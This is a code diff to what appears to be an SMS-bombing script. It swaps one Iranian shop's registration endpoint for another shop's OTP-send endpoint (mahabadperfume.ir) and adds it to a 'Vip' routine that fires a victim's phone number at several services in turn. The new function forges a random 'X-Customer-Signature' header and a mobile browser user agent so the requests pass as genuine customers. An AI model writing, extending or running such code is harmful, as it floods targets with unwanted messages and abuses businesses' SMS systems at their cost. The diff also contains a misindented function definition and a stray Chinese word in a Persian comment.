@@ -46,36 +46,41 @@ def check_internet():
 # ------------------------------
 # SMS services
 # ------------------------------
-def darukade(phone):
+
+ def mahabadperfume(phone):
     import requests
+    import uuid
     
     formatted_phone = "0" + phone.replace("+98", "")
-    url = "https://darukade.com/api/auth/register"
+    url = "https://mahabadperfume.ir/backend/customer/v2/otp-send/s/"
     
     payload = {
-        "Mobile": formatted_phone,
-        "FirstName": "نام",
-        "LastName": "خانوادگی", 
-        "Gender": "false"
+        "phone_number": formatted_phone,
+        "is_forget_password": False
     }
     
     headers = {
         "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
         "Accept": "application/json, text/plain, */*",
         "Content-Type": "application/json",
-        "Origin": "https://darukade.com",
-        "Referer": "https://darukade.com/",
+        "X-Customer-Signature": str(uuid.uuid4()),  #生成 یک UUID تصادفی
+        "Origin": "https://mahabadperfume.ir",
+        "Referer": "https://mahabadperfume.ir/",
+        "accept-language": "fa-IR",
     }
     
     try:
         response = requests.post(url, json=payload, headers=headers, timeout=10)
+        
         if response.status_code == 200:
-            print(f'{g}(darukade) {a}Code Sent')
+            print(f'{g}(mahabadperfume) {a}Code Sent')
             return True
-        print(f'{r}[-] (darukade) HTTP Error: {response.status_code}{a}')
-        return False
+        else:
+            print(f'{r}[-] (mahabadperfume) HTTP Error: {response.status_code}{a}')
+            return False
+            
     except Exception as e:
-        print(f'{r}[!] darukade Exception: {e}{a}')
+        print(f'{r}[!] mahabadperfume Exception: {e}{a}')
         return False
 
 def theshoes(phone):
@@ -126,7 +131,7 @@ def send_service_safe(service, phone):
 def Vip(phone, Time):
     services = [
         
-        theshoes,    darukade,  # اضافه کردن سرویس theshoes
+        theshoes,    mahabadperfume,  # اضافه کردن سرویس theshoes
     ]
     total_services = len(services)
 
